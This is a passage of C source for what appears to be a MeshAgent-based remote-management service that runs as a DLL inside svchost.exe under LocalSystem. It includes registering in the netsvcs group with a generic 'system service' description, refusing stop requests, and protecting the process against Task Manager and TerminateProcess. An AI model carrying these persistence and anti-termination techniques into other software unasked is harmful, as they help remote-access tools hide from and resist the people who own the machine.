    if (bridgeStdIn != NULL) { CloseHandle(bridgeStdIn); }
}
#endif

static void ServiceHost_LogLine(const wchar_t* format, ...)
{
    if (format == NULL) { return; }
    if (g_ServiceHostLogFile[0] == L'\0') { return; }

    FILE* logFile = NULL;
    if (_wfopen_s(&logFile, g_ServiceHostLogFile, L"a+, ccs=UTF-8") != 0 || logFile == NULL)
    {
        return;
    }

    SYSTEMTIME st;
    GetLocalTime(&st);
    fwprintf(logFile,
             L"[%04u-%02u-%02u %02u:%02u:%02u.%03u] ",
             st.wYear,
             st.wMonth,
             st.wDay,
             st.wHour,
             st.wMinute,
             st.wSecond,
             st.wMilliseconds);

    va_list args;
    va_start(args, format);
    vfwprintf(logFile, format, args);
    va_end(args);
	fputwc(L'\n', logFile);
	fclose(logFile);
}

static BOOL ServiceHost_TokenHasSid(PSID sid)
{
    BOOL isMember = FALSE;

    if (sid == NULL) { return FALSE; }
    if (!CheckTokenMembership(NULL, sid, &isMember)) { return FALSE; }
    return isMember;
}

static BOOL ServiceHost_CanHardenModuleDacl(void)
{
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PSID administratorsSid = NULL;
    PSID localSystemSid = NULL;
    BOOL allow = FALSE;

    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsSid))
    {
        allow = ServiceHost_TokenHasSid(administratorsSid);
        FreeSid(administratorsSid);
        administratorsSid = NULL;
    }
    if (allow == FALSE &&
        AllocateAndInitializeSid(&ntAuthority, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &localSystemSid))
    {
        allow = ServiceHost_TokenHasSid(localSystemSid);
        FreeSid(localSystemSid);
        localSystemSid = NULL;
    }
    return allow;
}

static BOOL ServiceHost_EnsureModuleDacl(void)
{
	PSECURITY_DESCRIPTOR pSD = NULL;
    PACL dacl = NULL;
    BOOL daclPresent = FALSE;
    BOOL daclDefaulted = FALSE;
    BOOL ok = FALSE;
    DWORD setResult = ERROR_SUCCESS;

    if (g_ServiceHostModulePath[0] == L'\0') { return FALSE; }
    if (GetFileAttributesW(g_ServiceHostModulePath) == INVALID_FILE_ATTRIBUTES) { return FALSE; }

    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
            SERVICE_DLL_DACL_SDDL,
            SDDL_REVISION_1,
            &pSD,
            NULL))
    {
        return FALSE;
    }

    if (GetSecurityDescriptorDacl(pSD, &daclPresent, &dacl, &daclDefaulted) &&
        daclPresent != FALSE &&
        dacl != NULL)
    {
        setResult = SetNamedSecurityInfoW(
            g_ServiceHostModulePath,
            SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
            NULL,
            NULL,
            dacl,
            NULL);
        if (setResult == ERROR_SUCCESS)
        {
            ok = TRUE;
        }
        else
        {
            SetLastError(setResult);
        }
    }

    if (pSD != NULL)
    {
        LocalFree(pSD);
    }
    return ok;
}

static BOOL ServiceHost_WideContains(const wchar_t* haystack, const wchar_t* needle)
{
    size_t needleLen = 0;

    if (haystack == NULL || needle == NULL || *needle == L'\0') { return FALSE; }
    while (needle[needleLen] != L'\0') { ++needleLen; }
    for (; *haystack != L'\0'; ++haystack)
    {
        size_t i = 0;
        while (i < needleLen && haystack[i] != L'\0' && haystack[i] == needle[i]) { ++i; }
        if (i == needleLen) { return TRUE; }
    }
    return FALSE;
}

static BOOL ServiceHost_IsKvmBridgeInvocation(void)
{
    return ServiceHost_WideContains(GetCommandLineW(), MESH_RUNDLL32_ENTRY_KVM_BRIDGE_W);
}

static BOOL ServiceHost_IsLifecycleHostInvocation(void)
{
    return ServiceHost_WideContains(GetCommandLineW(), MESH_RUNDLL32_ENTRY_LIFECYCLE_W);
}

static void ServiceHost_InvalidParameterHandler(
    const wchar_t* expression,
    const wchar_t* function,
    const wchar_t* file,
    unsigned int line,
    uintptr_t reserved)
{
    UNREFERENCED_PARAMETER(reserved);
    const wchar_t* expr = (expression != NULL) ? expression : L"(null)";
    const wchar_t* func = (function != NULL) ? function : L"(null)";
    const wchar_t* src = (file != NULL) ? file : L"(null)";
    ServiceHost_LogLine(L"CRT invalid parameter detected: expr=%ls func=%ls file=%ls line=%u",
                           expr,
                           func,
                           src,
                           line);
    ServiceUtil_DebugPrintfW(L"[svchost] CRT invalid parameter: expr=%ls func=%ls file=%ls line=%u",
                         expr,
                         func,
                         src,
                         line);

    void* frames[16] = { 0 };
    USHORT captured = RtlCaptureStackBackTrace(0, (ULONG)(sizeof(frames) / sizeof(frames[0])), frames, NULL);
    for (USHORT i = 0; i < captured; ++i)
    {
        ServiceHost_LogLine(L"CRT invalid parameter stack[%u]=%p", (unsigned int)i, frames[i]);
    }
    if (ServiceHost_IsKvmBridgeInvocation())
    {
        ServiceHost_LogLine(L"CRT invalid parameter in KvmSessionBridgeW; terminating helper for WER capture");
        RaiseFailFastException(NULL, NULL, 0);
        TerminateProcess(GetCurrentProcess(), 0xC0000417u);
    }
}

static void ServiceHost_InstallCrtHandlers(void)
{
    if (g_ServiceHostCrtHandlersInstalled != FALSE)
    {
        return;
    }

    _set_invalid_parameter_handler(ServiceHost_InvalidParameterHandler);
    _set_thread_local_invalid_parameter_handler(ServiceHost_InvalidParameterHandler);
    g_ServiceHostCrtHandlersInstalled = TRUE;
}

static void ServiceHost_InitializePaths(HINSTANCE moduleHandle)
{
    if (g_ServiceHostPathsInitialized != FALSE) { return; }

    HINSTANCE targetModule = moduleHandle;
    if (targetModule == NULL)
    {
#if defined(BUILD_SERVICE_BUNDLE_DLL)
        HINSTANCE discovered = NULL;
        if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                               (LPCWSTR)&ServiceHost_InitializePaths,
                               &discovered) != 0)
        {
            targetModule = discovered;
        }
#endif
    }

    if (targetModule != NULL)
    {
        DWORD len = GetModuleFileNameW(targetModule, g_ServiceHostModulePath, (DWORD)_countof(g_ServiceHostModulePath));
        if (len == 0 || len >= _countof(g_ServiceHostModulePath))
        {
            g_ServiceHostModulePath[0] = L'\0';
        }
    }

    if (g_ServiceHostModulePath[0] == L'\0')
    {
        DWORD len = GetModuleFileNameW(NULL, g_ServiceHostModulePath, (DWORD)_countof(g_ServiceHostModulePath));
        if (len == 0 || len >= _countof(g_ServiceHostModulePath))
        {
            g_ServiceHostModulePath[0] = L'\0';
        }
    }

    if (g_ServiceHostModulePath[0] != L'\0')
    {
        lstrcpynW(g_ServiceHostInstallDir, g_ServiceHostModulePath, (int)_countof(g_ServiceHostInstallDir));
        wchar_t* slash = wcsrchr(g_ServiceHostInstallDir, L'\\');
        if (slash != NULL) { *slash = L'\0'; }
        ServiceUtil_DebugPrintfW(L"[svchost] module path: %ls", g_ServiceHostModulePath);
        ServiceUtil_DebugPrintfW(L"[svchost] install directory: %ls", g_ServiceHostInstallDir);
        _snwprintf_s(g_ServiceHostLogFile, _countof(g_ServiceHostLogFile), _TRUNCATE, L"%s\\svchost-debug.log", g_ServiceHostInstallDir);
        ServiceHost_LogLine(L"module path: %ls", g_ServiceHostModulePath);
        ServiceHost_LogLine(L"install directory: %ls", g_ServiceHostInstallDir);
        ServiceHost_InstallCrtHandlers();
        if (ServiceHost_CanHardenModuleDacl())
        {
            if (!ServiceHost_EnsureModuleDacl())
            {
                DWORD aclError = GetLastError();
                if (aclError == ERROR_SUCCESS) { aclError = ERROR_ACCESS_DENIED; }
                ServiceUtil_DebugPrintfW(L"[svchost] failed to apply DLL DACL to %ls (error=%lu)", g_ServiceHostModulePath, aclError);
                ServiceHost_LogLine(L"failed to apply DLL DACL to %ls (error=%lu)", g_ServiceHostModulePath, aclError);
            }
        }
        else
        {
            ServiceHost_LogLine(L"skipping DLL DACL hardening for non-elevated process token");
        }
    }
    else
    {
        ServiceUtil_DebugPrintfW(L"[svchost] unable to resolve module path for DLL");
        ServiceHost_LogLine(L"module path resolution failed");
        g_ServiceHostLogFile[0] = L'\0';
    }

    if (g_ServiceHostExeUtf8 == NULL)
    {
        g_ServiceHostExeUtf8 = ILibMemory_Init(g_ServiceHostExeStorage, 2048, sizeof(void*), ILibMemory_Types_OTHER);
    }
    if (g_ServiceHostExeUtf8 != NULL)
    {
        const wchar_t *preferredExe = NULL;
        wchar_t helperPath[MAX_PATH] = { 0 };
        wchar_t brandedName[MAX_PATH] = { 0 };
        BOOL helperExists = FALSE;
        BOOL lifecycleHostInvocation = ServiceHost_IsLifecycleHostInvocation();

        MeshService_CopyBrandingTextToWide(MeshService_GetBinaryNameText(), brandedName, _countof(brandedName));
        if (brandedName[0] == L'\0')
        {
            lstrcpynW(brandedName, SERVICE_FALLBACK_EXE_NAME, (int)_countof(brandedName));
        }
        ServiceHost_LogLine(L"branding binary name resolved: %ls", brandedName[0] != L'\0' ? brandedName : L"(empty)");

        if (lifecycleHostInvocation)
        {
            ServiceHost_LogLine(L"lifecycle host invocation; helper resolution skipped");
        }
        else if (g_ServiceHostInstallDir[0] != L'\0')
        {
            wchar_t candidate[MAX_PATH] = { 0 };

            if (brandedName[0] != L'\0' &&
                _snwprintf_s(candidate, _countof(candidate), _TRUNCATE, L"%s\\%s", g_ServiceHostInstallDir, brandedName) > 0)
            {
                lstrcpynW(helperPath, candidate, (int)_countof(helperPath));
                helperExists = (GetFileAttributesW(candidate) != INVALID_FILE_ATTRIBUTES);
                ServiceHost_LogLine(L"helper candidate: %ls (exists=%d)", helperPath, helperExists ? 1 : 0);
                if (helperExists)
                {
                    ServiceUtil_DebugPrintfW(L"[svchost] helper executable detected: %ls", helperPath);
                    ServiceHost_LogLine(L"helper executable: %ls", helperPath);
                }
                else
                {
                    ServiceUtil_DebugPrintfW(L"[svchost] configured helper executable is missing: %ls", helperPath);
                    ServiceHost_LogLine(L"configured helper executable missing: %ls", helperPath);
                }
            }
        }

        if (helperExists != FALSE)
        {
            preferredExe = helperPath;
        }

        if (preferredExe != NULL && preferredExe[0] != L'\0')
        {
            WideCharToMultiByte(CP_UTF8,
                                0,
                                preferredExe,
                                -1,
                                g_ServiceHostExeUtf8,
                                (int)ILibMemory_Size(g_ServiceHostExeUtf8),
                                NULL,
                                NULL);
            g_ServiceHostArgv[0] = g_ServiceHostExeUtf8;
        }
    }
    else
    {
        ServiceUtil_DebugPrintfA("[svchost] failed to initialise UTF-8 module buffer");
    }

    g_ServiceHostPathsInitialized = TRUE;
}

static void ServiceHost_LogProvisioningStatus(void)
{
    wchar_t candidatePath[MAX_PATH] = {0};
    wchar_t leafName[MAX_PATH] = {0};
    wchar_t baseName[MAX_PATH] = {0};
    DWORD attr = INVALID_FILE_ATTRIBUTES;

    if (g_ServiceHostInstallDir[0] == L'\0')
    {
        ServiceUtil_DebugPrintfW(L"[svchost] install directory unavailable; provisioning files cannot be validated");
        ServiceHost_LogLine(L"provisioning check skipped: install directory unavailable");
        return;
    }

    MeshService_CopyBrandingTextToWide(MeshService_GetBinaryNameText(), leafName, _countof(leafName));
    if (leafName[0] != L'\0')
    {
        lstrcpynW(baseName, leafName, (int)_countof(baseName));
        {
            wchar_t* dot = wcsrchr(baseName, L'.');
            if (dot != NULL) { *dot = L'\0'; }
        }
        if (baseName[0] != L'\0')
        {
            _snwprintf_s(candidatePath, _countof(candidatePath), _TRUNCATE, L"%s\\%s.msh", g_ServiceHostInstallDir, baseName);
            attr = GetFileAttributesW(candidatePath);
            ServiceUtil_DebugPrintfW(L"[svchost] executable sibling provisioning file %ls (%ls)",
                                 candidatePath,
                                 (attr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
            ServiceHost_LogLine(L"executable sibling provisioning file %ls (%ls)",
                                   candidatePath,
                                   (attr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
        }
    }

    leafName[0] = L'\0';
    MeshService_CopyBrandingTextToWide(MeshService_GetConfigFileNameText(), leafName, _countof(leafName));
    if (leafName[0] != L'\0')
    {
        _snwprintf_s(candidatePath, _countof(candidatePath), _TRUNCATE, L"%s\\%s", g_ServiceHostInstallDir, leafName);
        attr = GetFileAttributesW(candidatePath);
        ServiceUtil_DebugPrintfW(L"[svchost] configuration file %ls (%ls)",
                             candidatePath,
                             (attr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
        ServiceHost_LogLine(L"configuration file %ls (%ls)",
                               candidatePath,
                               (attr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
    }
}

/**
 * Service control handler for svchost-hosted mode
 */
DWORD WINAPI ServiceHost_CtrlHandler(
    DWORD dwControl,
    DWORD dwEventType,
    LPVOID lpEventData,
    LPVOID lpContext)
{
    UNREFERENCED_PARAMETER(lpContext);

    switch (dwControl)
    {
        case SERVICE_CONTROL_STOP:
            ServiceHost_RefreshControlsAccepted();
            if (!ServiceHost_AllowStop())
            {
                ServiceHost_LogLine(L"Stop control ignored");
                ServiceHost_ReportStopDenial();
                SetLastError(ERROR_SERVICE_CANNOT_ACCEPT_CTRL);
                return ERROR_SERVICE_CANNOT_ACCEPT_CTRL;
            }

            g_ServiceHostStatus.dwCurrentState = SERVICE_STOP_PENDING;
            g_ServiceHostStatus.dwCheckPoint = 0;
            g_ServiceHostStatus.dwWaitHint = 5000;
            SetServiceStatus(g_ServiceHostStatusHandle, &g_ServiceHostStatus);

            g_ServiceHostRunning = FALSE;

            (void)ServiceHost_RequestAgentStop();
            ServiceHost_LogLine(L"Stop requested asynchronously; waiting for MeshAgent_Start to return");
            SetServiceStatus(g_ServiceHostStatusHandle, &g_ServiceHostStatus);

            return NO_ERROR;

        case SERVICE_CONTROL_SHUTDOWN:
            g_ServiceHostStatus.dwCurrentState = SERVICE_STOP_PENDING;
            g_ServiceHostStatus.dwCheckPoint = 0;
            g_ServiceHostStatus.dwWaitHint = 5000;
            SetServiceStatus(g_ServiceHostStatusHandle, &g_ServiceHostStatus);

            g_ServiceHostRunning = FALSE;

            (void)ServiceHost_RequestAgentStop();
            ServiceHost_LogLine(L"Shutdown requested asynchronously; waiting for MeshAgent_Start to return");
            SetServiceStatus(g_ServiceHostStatusHandle, &g_ServiceHostStatus);

            return NO_ERROR;

        case SERVICE_CONTROL_INTERROGATE:
            // Report current status and refresh stop acceptance
            ServiceHost_RefreshControlsAccepted();
            return NO_ERROR;

        case SERVICE_CONTROL_PAUSE:
            // Not supported
            return ERROR_CALL_NOT_IMPLEMENTED;

        case SERVICE_CONTROL_CONTINUE:
            // Not supported
            return ERROR_CALL_NOT_IMPLEMENTED;

        case SERVICE_CONTROL_POWEREVENT:
            // Handle power events if needed
            switch (dwEventType)
            {
                case PBT_APMSUSPEND:
                    // System is suspending
                    break;
                case PBT_APMRESUMESUSPEND:
                    // System is resuming
                    break;
            }
            return NO_ERROR;

        case SERVICE_CONTROL_SESSIONCHANGE:
        {
            DWORD sessionId = 0;
            if (lpEventData != NULL)
            {
                WTSSESSION_NOTIFICATION* sessionNotification = (WTSSESSION_NOTIFICATION*)lpEventData;
                if (sessionNotification->cbSize >= sizeof(WTSSESSION_NOTIFICATION))
                {
                    sessionId = sessionNotification->dwSessionId;
                }
            }

#ifdef MESHAGENT_ENABLE_RUNTIME_FEATURES
            ServiceIntegration_HandleSessionChange(dwEventType, sessionId);
#endif
#if defined(_LINKVM)
            ServiceUtil_DebugPrintfA("[svchost] Forwarding KVM session change event=%lu session=%lu", (unsigned long)dwEventType, (unsigned long)sessionId);
            ServiceHost_LogLine(L"Forwarding KVM session change event=%lu session=%lu", (unsigned long)dwEventType, (unsigned long)sessionId);
            kvm_notify_session_change(dwEventType, sessionId);
#endif
            return NO_ERROR;
        }

        default:
            return ERROR_CALL_NOT_IMPLEMENTED;
    }
}

/**
 * Main service entry point for svchost.exe hosting
 * This is the function that svchost.exe calls when starting our service
 */
VOID WINAPI ServiceHost_ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
{
    // DWORD i; // not used; removed to avoid unused variable warning

    // Register service control handler
    ServiceHost_LogLine(L"ServiceMain invoked (argc=%lu)", (unsigned long)dwArgc);
    LPCTSTR svcKeyName = (LPCTSTR)MeshService_GetServiceFileText();
    g_ServiceHostStatusHandle = RegisterServiceCtrlHandlerEx(
        svcKeyName,
        (LPHANDLER_FUNCTION_EX)ServiceHost_CtrlHandler,
        NULL                    // Context
    );

    if (!g_ServiceHostStatusHandle)
    {
        ServiceUtil_DebugLastErrorW(L"RegisterServiceCtrlHandlerEx");
        return;  // Failed to register handler
    }

    // Initialize service status structure
    g_ServiceHostStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;  // Shared svchost service
    g_ServiceHostStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceHostStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP |
                                          SERVICE_ACCEPT_SHUTDOWN |
                                          SERVICE_ACCEPT_POWEREVENT |
                                          SERVICE_ACCEPT_SESSIONCHANGE;
    g_ServiceHostStatus.dwWin32ExitCode = NO_ERROR;
    g_ServiceHostStatus.dwServiceSpecificExitCode = 0;
    g_ServiceHostStatus.dwCheckPoint = 0;
    g_ServiceHostStatus.dwWaitHint = 3000;

    // Report initial status
    SetServiceStatus(g_ServiceHostStatusHandle, &g_ServiceHostStatus);

    ServiceHost_InitializePaths(NULL);

    // Initialize MeshAgent core with default capabilities
    g_ServiceHostAgent = MeshAgent_Create(0);

    if (!g_ServiceHostAgent)
    {
        ServiceUtil_DebugPrintfA("MeshAgent_Create failed in svchost service main");
        ServiceHost_LogLine(L"MeshAgent_Create failed");
        // Failed to create agent
        g_ServiceHostStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceHostStatus.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR;
        g_ServiceHostStatus.dwServiceSpecificExitCode = 1;
        SetServiceStatus(g_ServiceHostStatusHandle, &g_ServiceHostStatus);
        return;
    }

    g_ServiceHostAgent->serviceReserved = 1;
    if (g_ServiceHostArgv[0] != NULL && g_ServiceHostExeUtf8 != NULL)
    {
        ((void**)ILibMemory_Extra(g_ServiceHostExeUtf8))[0] = g_ServiceHostAgent;
        g_ServiceHostAgent->exePath = g_ServiceHostExeUtf8;
        ServiceHost_LogLine(L"agent exePath set to %hs", g_ServiceHostExeUtf8);
    }

    mesh_branding_text_t serviceFileText = MeshService_GetServiceFileText();
    mesh_branding_text_t serviceDisplayText = MeshService_GetServiceNameText();
#if defined(UNICODE) || defined(_UNICODE)
    if (serviceFileText != NULL)
    {
        char utf8Name[128] = {0};
        if (WideCharToMultiByte(CP_UTF8, 0, serviceFileText, -1, utf8Name, (int)sizeof(utf8Name), NULL, NULL) > 0)
        {
            g_ServiceHostAgent->meshServiceName = ILibString_Copy(utf8Name, 0);
            ServiceHost_LogLine(L"service name set to %hs", g_ServiceHostAgent->meshServiceName);
        }
    }
    if (serviceDisplayText != NULL)
    {
        char utf8Display[256] = {0};
        if (WideCharToMultiByte(CP_UTF8, 0, serviceDisplayText, -1, utf8Display, (int)sizeof(utf8Display), NULL, NULL) > 0)
        {
            g_ServiceHostAgent->displayName = ILibString_Copy(utf8Display, 0);
        }
    }
#else
    if (serviceFileText != NULL)
    {
        g_ServiceHostAgent->meshServiceName = ILibString_Copy(serviceFileText, 0);
        ServiceHost_LogLine(L"service name set to %hs", g_ServiceHostAgent->meshServiceName);
    }
    if (serviceDisplayText != NULL)
    {
        g_ServiceHostAgent->displayName = ILibString_Copy(serviceDisplayText, 0);
    }
#endif
    g_ServiceHostAgent->JSRunningAsService = 1;
    g_ServiceHostAgent->JSRunningWithAdmin = 1;

    if (g_ServiceHostInstallDir[0] != L'\0')
    {
        if (!SetCurrentDirectoryW(g_ServiceHostInstallDir))
        {
            ServiceUtil_DebugLastErrorW(L"SetCurrentDirectoryW");
            ServiceHost_LogLine(L"SetCurrentDirectoryW failed (%lu)", GetLastError());
        }
        else
        {
            ServiceHost_LogLine(L"working directory set to %ls", g_ServiceHostInstallDir);
        }
    }
    ServiceHost_LogProvisioningStatus();

    // Update status to RUNNING
    g_ServiceHostStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceHostStatus.dwCheckPoint = 0;
    g_ServiceHostStatus.dwWaitHint = 0;
    SetServiceStatus(g_ServiceHostStatusHandle, &g_ServiceHostStatus);

    // Apply process-level termination protection
    // This prevents Task Manager and TerminateProcess() from killing our svchost.exe
    // NOTE: This is different from ServiceUtil_ProtectServiceFromTermination() which only
    // protects the SERVICE object in SCM. This protects the actual PROCESS.
    if (ServiceUtil_ProtectCurrentProcess())
    {
        ServiceHost_LogLine(L"Process termination protection applied successfully");
        ServiceUtil_DebugPrintfW(L"[svchost] Process DACL protection active - TerminateProcess blocked");
    }
    else
    {
        ServiceHost_LogLine(L"WARNING: Failed to apply process termination protection");
        ServiceUtil_DebugPrintfW(L"[svchost] WARNING: Process DACL protection failed");
    }

    g_ServiceHostRunning = TRUE;

    char* startArgv[2] = { NULL, NULL };
    if (g_ServiceHostArgv[0] != NULL)
    {
        startArgv[0] = g_ServiceHostArgv[0];
    }
    if (startArgv[0] == NULL)
    {
        ServiceUtil_DebugPrintfA("[svchost] configured helper path is unavailable; refusing to start MeshAgent core");
        ServiceHost_LogLine(L"configured helper path unavailable; MeshAgent_Start skipped");
        g_ServiceHostStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceHostStatus.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR;
        g_ServiceHostStatus.dwServiceSpecificExitCode = 2;
        SetServiceStatus(g_ServiceHostStatusHandle, &g_ServiceHostStatus);
        return;
    }
    int startArgc = 1;

    ServiceUtil_DebugPrintfA("[svchost] launching MeshAgent_Start (argv[0]=%s)", startArgv[0]);
    ServiceHost_LogLine(L"launching MeshAgent_Start (argv0=%hs)", startArgv[0]);
    int startResult = MeshAgent_Start(g_ServiceHostAgent, startArgc, startArgv);
    ServiceUtil_DebugPrintfA("[svchost] MeshAgent_Start returned %d", startResult);
    ServiceHost_LogLine(L"MeshAgent_Start returned %d", startResult);
    if (g_ServiceHostAgent != NULL)
    {
        ServiceHost_LogLine(L"MeshAgent exit code %d", g_ServiceHostAgent->exitCode);
    }
    g_ServiceHostAgent = NULL;
    g_ServiceHostRunning = FALSE;

    // Service has stopped
    g_ServiceHostStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_ServiceHostStatusHandle, &g_ServiceHostStatus);
}

/**
 * Register service for svchost.exe hosting
 * Creates required registry entries for svchost to load our DLL
 */
BOOL ServiceHost_RegisterServiceHostService(const wchar_t* serviceName, const wchar_t* dllPath)
{
    HKEY hKey = NULL;
    HKEY hParamsKey = NULL;
    HKEY hServiceHostKey = NULL;
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;
    LONG result;
    BOOL success = FALSE;
    BOOL netsvcsConfigured = FALSE;
    wchar_t keyPath[512];
    DWORD dwType, dwSize;
    WCHAR wDisplayName[256] = {0};
    WCHAR wDescription[512] = {0};
    const wchar_t* groupName = L"netsvcs";
    WCHAR hostExePath[MAX_PATH] = {0};
    BOOL hostExeUsesExpand = FALSE;
    WCHAR imagePathValue[512] = {0};
    BOOL serviceSidConfigured = FALSE;

    if (serviceName == NULL || serviceName[0] == 0 || dllPath == NULL || dllPath[0] == 0)
    {
        ServiceUtil_DebugPrintfW(L"ServiceHost_RegisterServiceHostService invalid parameters (service=%ls path=%ls)", serviceName, dllPath);
        return FALSE;
    }

    if (!ServiceHost_SelectServiceHostImage(dllPath, hostExePath, _countof(hostExePath), &hostExeUsesExpand))
    {
        ServiceUtil_DebugPrintfW(L"ServiceHost_RegisterServiceHostService failed to resolve system svchost.exe (error=%lu)", GetLastError());
        return FALSE;
    }

    _snwprintf_s(imagePathValue, _countof(imagePathValue), _TRUNCATE, L"%s -k %s -p", hostExePath, groupName);

    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), wDisplayName, _countof(wDisplayName));
    MeshService_CopyBrandingTextToWide(MeshConfig_GetBranding()->fileDescription, wDescription, _countof(wDescription));
    if (wDescription[0] == 0)
    {
        lstrcpynW(wDescription, L"system service", (int)_countof(wDescription));
    }

    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (hSCM != NULL)
    {
        hService = CreateServiceW(
            hSCM,
            serviceName,
            (wDisplayName[0] != 0) ? wDisplayName : serviceName,
            SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_CHANGE_CONFIG | DELETE,
            SERVICE_WIN32_SHARE_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            imagePathValue,
            NULL,
            NULL,
            NULL,
            L"LocalSystem",
            NULL);

        if (hService == NULL)
        {
            if (GetLastError() == ERROR_SERVICE_EXISTS)
            {
                hService = OpenServiceW(hSCM, serviceName, SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_CHANGE_CONFIG | DELETE);
                if (hService != NULL)
                {
                    if (!ChangeServiceConfigW(
                        hService,
                        SERVICE_WIN32_SHARE_PROCESS,
                        SERVICE_AUTO_START,
                        SERVICE_ERROR_NORMAL,
                        imagePathValue,
                        NULL,
                        NULL,
                        NULL,
                        NULL,
                        L"LocalSystem",
                        (wDisplayName[0] != 0) ? wDisplayName : NULL))
                    {
                        ServiceUtil_DebugLastErrorW(L"ChangeServiceConfigW");
                        goto CLEANUP;
                    }
                }
                else
                {
                    ServiceUtil_DebugLastErrorW(L"OpenServiceW");
                }
            }
            else
            {
                ServiceUtil_DebugLastErrorW(L"CreateServiceW");
            }
        }
    }
    else
    {
        ServiceUtil_DebugLastErrorW(L"OpenSCManagerW");
        goto CLEANUP;
    }

    if (hService == NULL)
    {
        ServiceUtil_DebugLastErrorW(L"RegCreateKeyEx(Service)");
        goto CLEANUP;
    }

    {
        SERVICE_SID_INFO sidInfo = {0};
        sidInfo.dwServiceSidType = SERVICE_SID_TYPE_UNRESTRICTED;
        if (ChangeServiceConfig2W(hService, SERVICE_CONFIG_SERVICE_SID_INFO, &sidInfo))
        {
            serviceSidConfigured = TRUE;
        }
        else
        {
            ServiceUtil_DebugLastErrorW(L"ChangeServiceConfig2W(ServiceSid)");
            goto CLEANUP;
        }
    }

    // Create service registry key
    swprintf_s(keyPath, sizeof(keyPath)/sizeof(wchar_t),
               L"SYSTEM\\CurrentControlSet\\Services\\%s", serviceName);

    result = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, NULL, 0,
                             KEY_WRITE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS)
    {
        goto CLEANUP;
    }

    // Set service type to SHARE_PROCESS
    DWORD dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    RegSetValueExW(hKey, L"Type", 0, REG_DWORD, (LPBYTE)&dwServiceType, sizeof(DWORD));

    // Set start type to AUTO_START
    DWORD dwStartType = SERVICE_AUTO_START;
    RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (LPBYTE)&dwStartType, sizeof(DWORD));

    // Set error control
    DWORD dwErrorControl = SERVICE_ERROR_NORMAL;
    RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (LPBYTE)&dwErrorControl, sizeof(DWORD));

    // Set ImagePath to svchost with netsvcs group
    RegSetValueExW(hKey, L"ImagePath", 0, hostExeUsesExpand ? REG_EXPAND_SZ : REG_SZ,
                   (LPBYTE)imagePathValue, (DWORD)((wcslen(imagePathValue) + 1) * sizeof(wchar_t)));

    // Set display name (generic)
    if (wDisplayName[0] != 0)
    {
        RegSetValueExW(hKey, L"DisplayName", 0, REG_SZ,
                       (LPBYTE)wDisplayName, (DWORD)((wcslen(wDisplayName) + 1) * sizeof(wchar_t)));
    }

    // Set description (generic)
    if (wDescription[0] != 0)
    {
        RegSetValueExW(hKey, L"Description", 0, REG_SZ,
                       (LPBYTE)wDescription, (DWORD)((wcslen(wDescription) + 1) * sizeof(wchar_t)));
    }

    // Set ObjectName (LocalSystem)
    const wchar_t* objectName = L"LocalSystem";
    RegSetValueExW(hKey, L"ObjectName", 0, REG_SZ,
                   (LPBYTE)objectName, (DWORD)((wcslen(objectName) + 1) * sizeof(wchar_t)));

    if (serviceSidConfigured)
    {
        DWORD serviceSidType = SERVICE_SID_TYPE_UNRESTRICTED;
        RegSetValueExW(hKey, L"ServiceSidType", 0, REG_DWORD, (LPBYTE)&serviceSidType, sizeof(serviceSidType));
    }

    // Create Parameters subkey
    result = RegCreateKeyExW(hKey, L"Parameters", 0, NULL, 0,
                             KEY_WRITE, NULL, &hParamsKey, NULL);
    if (result == ERROR_SUCCESS)
    {
        // Set ServiceDll parameter (optional)
        if (dllPath && *dllPath)
        {
            RegSetValueExW(hParamsKey, L"ServiceDll", 0, REG_EXPAND_SZ,
                           (LPBYTE)dllPath, (DWORD)((wcslen(dllPath) + 1) * sizeof(wchar_t)));
        }

        // Set ServiceMain export name and unload policy
        const wchar_t* serviceMain = L"ServiceHost_ServiceMain";
        RegSetValueExW(hParamsKey, L"ServiceMain", 0, REG_SZ,
                       (LPBYTE)serviceMain, (DWORD)((wcslen(serviceMain) + 1) * sizeof(wchar_t)));
        DWORD unload = 1;
        RegSetValueExW(hParamsKey, L"ServiceDllUnloadOnStop", 0, REG_DWORD, (LPBYTE)&unload, sizeof(unload));

        RegCloseKey(hParamsKey);
        hParamsKey = NULL;
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    // Add service to svchost netsvcs group
    result = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                           L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ServiceHost",
